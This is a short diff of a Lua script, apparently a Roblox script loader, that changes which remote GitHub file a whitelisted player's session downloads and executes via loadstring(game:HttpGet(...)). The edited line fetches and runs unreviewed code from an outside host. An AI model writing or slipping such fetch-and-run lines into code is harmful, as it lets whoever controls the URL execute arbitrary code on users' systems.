@@ -14,7 +14,7 @@ _G.blacklisted = {
 function giveAccess(player)
     for i, v in next, _G.whitelisted do
         if i == player.UserId then
-           loadstring(game:HttpGet("https://raw.githubusercontent.com/Moat2/UI/main/Load"))()
+           loadstring(game:HttpGet("https://raw.githubusercontent.com/Moat2/Meow/main/jeez"))()
         end
     end
 end
